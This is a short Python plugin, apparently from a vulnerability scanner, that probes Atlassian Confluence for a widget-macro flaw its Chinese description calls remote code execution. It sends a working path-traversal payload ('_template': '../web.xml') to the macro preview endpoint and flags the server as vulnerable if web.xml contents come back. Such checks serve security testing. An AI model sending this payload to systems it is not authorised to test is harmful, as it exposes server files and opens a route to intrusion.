# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "Confluence远程代码执行漏洞",
        "description": "利用该漏洞可以读取服务器上任意文件，进而可以包含恶意文件来执行代码。可能造成敏感信息泄露，服务器被控制等严重后果。",
    }

    def url(self) -> dict:
        r = self.request(
            method='post',
            path='./rest/tinymce/1/macro/preview',
            timeout=15,
            data={
                "contentId": "786457",
                "macro": {
                    "name": "widget", "body": "", "params": {
                        "url": "https://www.viddler.com/v/23464dc5",
                        "width": "1000", "height": "1000",
                        "_template": "../web.xml"
                    }
                }
            }
        )
        if r.status_code == 200 and '<param-name>contextConfigLocation</param-name>' in r.text:
            return {
                "LoopholeInfo": {"app": "Confluence", "name": "Confluence远程代码执行漏洞"}
            }
